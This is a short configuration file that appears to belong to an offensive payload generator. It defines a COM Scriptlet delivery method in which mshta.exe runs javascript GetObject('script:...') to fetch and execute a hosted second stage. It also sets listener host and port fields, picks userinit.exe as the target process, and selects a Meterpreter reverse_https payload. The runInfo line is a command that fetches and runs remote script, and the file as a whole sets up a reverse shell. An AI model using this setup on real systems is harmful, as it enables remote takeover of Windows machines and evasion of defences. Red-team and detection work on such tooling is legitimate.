[Type]
name: getObject
info: COM Scriptlet (SCT) using javascript getObject()
template: ./template/SCT/getObject.template
runInfo: mshta.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:${Output:var}").Test();

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 80
allowWilds: True
forceInteger: true
help: Your listener port

[Processx86]
var: userinit.exe
allowWilds: True
help: May be any .exe in //System32/

[Processx64]
var: userinit.exe
allowWilds: True
help: May be any .exe in //SysWOW64/

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Output]
var: getObject.sct
allowWilds: true
